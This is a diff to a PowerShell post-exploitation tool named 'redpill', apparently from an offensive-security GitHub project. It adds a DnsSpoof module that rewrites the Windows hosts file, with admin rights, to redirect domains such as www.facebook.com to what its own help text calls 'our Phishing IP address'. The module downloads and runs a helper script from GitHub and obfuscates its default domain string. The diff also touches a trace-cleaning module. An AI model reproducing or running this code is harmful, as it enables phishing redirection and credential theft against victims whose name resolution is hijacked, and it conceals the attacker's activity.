@@ -80,11 +80,14 @@
    [string]$StreamData="false", [int]$Rate='1', [int]$TimeOut='5',
    [int]$BeaconTime='10', [int]$Interval='10', [int]$NewEst='10',
    [int]$Volume='88', [int]$Screenshot='0', [int]$Timmer='10',
-   [string]$FolderRigths="false", [string]$UserGroup="false",
+   [string]$FolderRigths="false", [string]$GroupName="false",
    [string]$Extension="false", [string]$FilePath="false",
    [string]$MetaData="false", [int]$ButtonType='0',
    [int]$SPort='8080', [string]$PEHollow="false",
+   [string]$Domain="www.facebook.com",
    [string]$AppLocker="false",
+   [string]$ToIPaddr="false",
+   [string]$DnsSpoof="false",
    [string]$Sponsor="false"
 )
 
@@ -1762,7 +1765,7 @@ If($CleanTracks -ieq "Clear" -or $CleanTracks -ieq "Paranoid"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/CleanTracks.ps1 -Destination $Env:TMP\CleanTracks.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\CleanTracks.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,3388671875/KB
+      If($SizeDump -lt 8){## Corrupted download detected => DefaultFileSize: 8,4541015625/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\CleanTracks.ps1"){Remove-Item -Path "$Env:TMP\CleanTracks.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1923,10 +1926,102 @@ if($AppLocker -ieq "Enum"){
    }
 
    ## Run auxiliary module
-   powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$UserGroup" -FolderRigths "$FolderRigths"
+   powershell -File "$Env:TMP\AppLocker.ps1" -GroupName "$GroupName" -FolderRigths "$FolderRigths"
 
    ## Clean Old files left behind
    If(Test-Path -Path "$Env:TMP\AppLocker.ps1"){Remove-Item -Path "$Env:TMP\AppLocker.ps1" -Force}
+}
+
+
+If($DnsSpoof -ne "false"){
+
+   <#
+   .SYNOPSIS
+      Redirect Domain Names to our Phishing IP address (dns spoof)
+   
+   .DESCRIPTION
+      Remark: This module its [ deprecated ]
+      Redirect Domain Names to our Phishing IP address
+
+   .NOTES
+      Required Dependencies: Administrator privileges on shell
+      Remark: This will never work if the server uses CDN or virtual
+      hosts. This only applies on servers with dedicated IPs.
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -DnsSpoof Enum
+      Display hosts file content (dns resolver)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -DnsSpoof Redirect -Domain "www.facebook.com" -ToIPaddr "192.168.1.72"
+      Backup original hosts file and redirect Domain Name www.facebook.com To IPaddress 192.168.1.72
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -DnsSpoof Clear
+      Revert hosts file to is original state before DnSpoof changes.
+
+   .OUTPUTS
+      Redirecting Domains Using hosts File (Dns Spoofing)
+      Clean dns cache before adding entry to hosts file.
+      Redirect Domain: www.facebook.com TO IPADDR: 192.168.1.72
+
+      # This file contains the mappings of IP addresses to host names. Each
+      # entry should be kept on an individual line. The IP address should
+      # be placed in the first column followed by the corresponding host name.
+      # The IP address and the host name should be separated by at least one
+      # space.
+      #
+      # Additionally, comments (such as these) may be inserted on individual
+      # lines or following the machine name denoted by a '#' symbol.
+      #
+      # For example:
+      #
+      #      102.54.94.97     rhino.acme.com          # source server
+      #       38.25.63.10     x.acme.com              # x client host
+      # localhost name resolution is handled within DNS itself.
+      #	127.0.0.1       localhost
+      #	::1             localhost
+      192.168.1.72 www.facebook.com
+   #>
+
+   ## Download DnsSpoof.ps1 from my GitHub
+   If(-not(Test-Path -Path "$Env:TMP\DnsSpoof.ps1")){## Download DnsSpoof.ps1 from my GitHub repository
+      Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/DnsSpoof.ps1 -Destination $Env:TMP\DnsSpoof.ps1 -ErrorAction SilentlyContinue|Out-Null
+      ## Check downloaded file integrity => FileSizeKBytes
+      $SizeDump = ((Get-Item -Path "$Env:TMP\DnsSpoof.ps1" -EA SilentlyContinue).length/1KB)
+      If($SizeDump -lt 6){## Corrupted download detected => DefaultFileSize: 6,8720703125/KB
+         Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
+         If(Test-Path -Path "$Env:TMP\DnsSpoof.ps1"){Remove-Item -Path "$Env:TMP\DnsSpoof.ps1" -Force}
+         Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
+      }   
+   }
+
+   ## Run auxiliary module
+   If($DnsSpoof -ieq "Enum"){
+
+       powershell -File "$Env:TMP\DnsSpoof.ps1" -DnsSpoof Enum
+
+   }ElseIf($DnsSpoof -ieq "Redirect"){
+
+       ## Make sure mandatory parameters are set
+       If($Domain -ieq "false"){## www.facebook.com
+           $Domain = "www.fac" + "ebook" + ".com" -join ''
+       }
+       If($ToIPaddr -ieq "false"){## www.google.pt
+           $ToIPaddr = "216.58" + ".21" + "5.131" -join ''
+       }
+
+       ## Execute auxiliary module
+       powershell -File "$Env:TMP\DnsSpoof.ps1" -DnsSpoof Redirect -Domain "$Domain" -ToIPaddr "$ToIPaddr"
+
+   }ElseIf($DnsSpoof -ieq "Clear"){
+
+       powershell -File "$Env:TMP\DnsSpoof.ps1" -DnsSpoof Clear
+
+   }
+
+   ## Clean Old files left behind
+   If(Test-Path -Path "$Env:TMP\DnsSpoof.ps1"){Remove-Item -Path "$Env:TMP\DnsSpoof.ps1" -Force}
 }
 
 
@@ -2959,7 +3054,7 @@ $HelpParameters = @"
 
 "@;
 Write-Host "$HelpParameters"
-}ElseIf($Help -ieq "AppLocker" -or $Help -ieq "UserGroup" -or $Help -ieq "FolderRigths"){
+}ElseIf($Help -ieq "AppLocker" -or $Help -ieq "GroupName" -or $Help -ieq "FolderRigths"){
 $HelpParameters = @"
 
    <#!Help.
@@ -2998,6 +3093,61 @@ $HelpParameters = @"
       FolderPath        : C:\WINDOWS\System32\Microsoft\Crypto\RSA\MachineKeys
       FileSystemRights  : Write
       IdentityReference : BUILTIN\Utilizadores
+   #>!bye..
+
+"@;
+Write-Host "$HelpParameters"
+}ElseIf($Help -ieq "DnsSpoof" -or $Help -ieq "Domain" -or $Help -ieq "ToIPaddr"){
+$HelpParameters = @"
+
+   <#!Help.
+   .SYNOPSIS
+      Author: @r00t-3xp10it
+      Helper - Redirect Domain Names to our Phishing IP address (dns spoof)
+   
+   .DESCRIPTION
+      Remark: This module its [ deprecated ]
+      Redirect Domain Names to our Phishing IP address
+
+   .NOTES
+      Required Dependencies: Administrator privileges on shell
+      Remark: This will never work if the server uses CDN or
+      virtual hosts This only applies on servers with dedicated IPs.
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -DnsSpoof Enum
+      Display hosts file content (dns resolver)
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -DnsSpoof Redirect -Domain "www.facebook.com" -ToIPaddr "192.168.1.72"
+      Backup original hosts file and redirect Domain Name www.facebook.com To IPaddress 192.168.1.72
+
+   .EXAMPLE
+      PS C:\> powershell -File redpill.ps1 -DnsSpoof Clear
+      Revert hosts file to is original state before DnSpoof changes.
+
+   .OUTPUTS
+      Redirecting Domains Using hosts File (Dns Spoofing)
+      Clean dns cache before adding entry to hosts file.
+      Redirect Domain: www.facebook.com TO IPADDR: 192.168.1.72
+
+      # This file contains the mappings of IP addresses to host names. Each
+      # entry should be kept on an individual line. The IP address should
+      # be placed in the first column followed by the corresponding host name.
+      # The IP address and the host name should be separated by at least one
+      # space.
+      #
+      # Additionally, comments (such as these) may be inserted on individual
+      # lines or following the machine name denoted by a '#' symbol.
+      #
+      # For example:
+      #
+      #      102.54.94.97     rhino.acme.com          # source server
+      #       38.25.63.10     x.acme.com              # x client host
+      # localhost name resolution is handled within DNS itself.
+      #	127.0.0.1       localhost
+      #	::1             localhost
+      192.168.1.72 www.facebook.com
    #>!bye..
 
 "@;
